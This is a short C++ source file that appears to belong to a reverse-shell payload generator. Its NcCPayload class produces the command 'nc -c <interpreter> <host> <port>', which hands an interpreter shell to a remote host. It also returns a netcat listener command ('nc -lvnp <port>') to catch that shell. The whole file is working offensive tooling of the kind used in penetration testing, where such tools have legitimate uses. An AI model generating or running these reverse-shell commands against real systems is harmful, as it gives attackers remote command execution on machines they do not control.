#include "Nc_C_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcCPayload::name() const {
return "nc_c";
}

std::string NcCPayload::generate(const Options& opts) const {
    return "nc -c " + opts.interpreter + " " + opts.host + " " + std::to_string(opts.port);
}

std::string NcCPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}